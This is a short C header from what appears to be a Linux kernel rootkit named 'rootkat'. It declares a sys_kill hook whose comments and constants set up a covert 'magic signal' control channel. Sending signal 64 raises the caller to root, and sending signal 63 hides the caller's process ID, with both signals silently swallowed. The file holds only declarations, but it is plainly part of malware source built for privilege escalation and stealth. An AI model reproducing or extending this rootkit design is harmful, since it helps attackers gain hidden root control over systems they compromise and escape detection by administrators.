/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_SYS_KILL_H
#define ROOTKAT_HOOK_SYS_KILL_H

/*
 * sys_kill hook — implements the magic-signal control surface.
 * Two signals are intercepted before they're delivered:
 *   ROOTKAT_PRIVESC_SIG  (64 / SIGRTMAX)   elevate caller to root
 *   ROOTKAT_HIDE_SIG     (63 / SIGRTMAX-1) add caller's PID to hidden list
 * Both swallow the signal (kill returns 0 without delivering it).
 */
#define ROOTKAT_PRIVESC_SIG 64
#define ROOTKAT_HIDE_SIG    63

/* Backwards-compat alias for earlier code that used MAGIC_SIG. */
#define ROOTKAT_MAGIC_SIG ROOTKAT_PRIVESC_SIG

int rootkat_hook_sys_kill_install(void);
void rootkat_hook_sys_kill_remove(void);

#endif
